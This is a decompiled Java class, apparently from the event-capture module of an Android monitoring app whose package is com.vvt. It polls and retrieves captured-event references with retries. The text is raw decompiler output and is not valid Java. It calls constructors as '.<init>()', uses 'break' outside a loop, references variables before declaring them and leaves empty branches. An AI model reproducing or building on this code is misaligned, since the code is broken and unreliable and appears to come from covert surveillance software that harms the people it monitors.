package com.vvt.capture.c.b.a.a.a;

import android.os.SystemClock;
import com.vvt.ak.a;
import com.vvt.base.capture.FxSimpleEventReference;
import com.vvt.base.capture.f;
import com.vvt.base.capture.g;
import com.vvt.capture.c.m;
import com.vvt.h.d;
import java.util.ArrayList;
import java.util.Collection;
import java.util.List;

public class b
  implements f
{
  private static final boolean a = a.a;
  private static final boolean b = a.d;
  private static final boolean c = a.e;
  private long d = -1;
  private d e;
  
  public b(d paramd)
  {
    this.e = paramd;
  }
  
  public g a()
  {
    long l1 = -1;
    boolean bool1 = a;
    if (bool1) {}
    FxSimpleEventReference localFxSimpleEventReference = new com/vvt/base/capture/FxSimpleEventReference;
    localFxSimpleEventReference.<init>();
    boolean bool2;
    try
    {
      String str = m.a();
      if (str != null)
      {
        long l2 = com.vvt.capture.c.b.a.b.b();
        bool1 = false;
        str = null;
        l3 = l2;
        int j = 0;
        for (;;)
        {
          boolean bool3 = l3 < l1;
          if (bool3) {
            break;
          }
          int k = 10;
          if (j >= k) {
            break;
          }
          l3 = 6000L;
          SystemClock.sleep(l3);
          long l4 = com.vvt.capture.c.b.a.b.b();
          int i = j + 1;
          j = i;
          l3 = l4;
        }
      }
      boolean bool4;
      bool2 = b;
    }
    catch (Exception localException)
    {
      bool2 = c;
      if (bool2) {}
      l3 = l1;
      bool4 = l3 < l1;
      if (bool4) {
        break label163;
      }
    }
    if (bool2) {}
    long l3 = this.d;
    for (;;)
    {
      Long localLong = Long.valueOf(l3);
      localFxSimpleEventReference.setReference(localLong);
      bool2 = a;
      if (bool2) {}
      return localFxSimpleEventReference;
      label163:
      this.d = l3;
    }
  }
  
  public List a(int paramInt)
  {
    boolean bool1 = a;
    if (bool1) {}
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    try
    {
      Object localObject = m.a();
      if (localObject != null)
      {
        long l1 = com.vvt.capture.c.b.a.b.b();
        long l2 = com.vvt.capture.c.b.a.b.a(paramInt);
        long l3 = 1L;
        l2 -= l3;
        d locald = this.e;
        localObject = com.vvt.capture.c.b.a.b.a(l2, l1, locald);
        localArrayList.addAll((Collection)localObject);
      }
    }
    catch (Exception localException)
    {
      for (;;)
      {
        boolean bool2 = c;
        if (!bool2) {}
      }
    }
    bool2 = a;
    if (bool2) {}
    return localArrayList;
  }
  
  public List a(g paramg1, g paramg2)
  {
    bool = a;
    if (bool) {}
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    try
    {
      Object localObject = paramg1.getReference();
      localObject = (Long)localObject;
      long l1 = ((Long)localObject).longValue();
      localObject = paramg2.getReference();
      localObject = (Long)localObject;
      long l2 = ((Long)localObject).longValue();
      localObject = this.e;
      localObject = com.vvt.capture.c.b.a.b.a(l1, l2, (d)localObject);
      localArrayList.addAll((Collection)localObject);
    }
    catch (Exception localException)
    {
      for (;;)
      {
        bool = c;
        if (!bool) {}
      }
    }
    bool = a;
    if (bool) {}
    return localArrayList;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/MyUncaughtExceptionHandler/removeFromPath/a/a/a/removeFromPath.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */